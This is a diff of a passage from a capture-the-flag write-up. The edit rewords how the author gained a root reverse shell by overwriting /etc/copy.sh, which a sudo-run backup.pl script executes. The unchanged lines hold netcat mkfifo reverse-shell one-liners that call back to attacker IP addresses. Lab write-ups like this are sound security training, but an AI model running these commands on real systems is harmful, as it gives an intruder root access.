@@ -330,7 +330,7 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.190 5554 >/tmp/f
 -----
 **Root Reverse Shell**
 
-I replaced the IP address in the copy .sh script with my IP (tun0) and replaced the contents of the copy. sh script. After this I ran netcat. Once I ran the the backup .pl script with the sudo command a new reverse shell is created as a root user. I can now read the root.txt flag under the root directory
+I updated the IP address in the copy.sh script with my own (tun0) and modified the script's contents. Following this, I ran netcat. Upon running the backup.pl script with the sudo command, a new reverse shell was generated with root privileges. I then gained access to read the root.txt flag located in the root directory."
 ```
 echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.13.0.39 5554 >/tmp/f" > /etc/copy.sh
 cat /etc/copy.sh
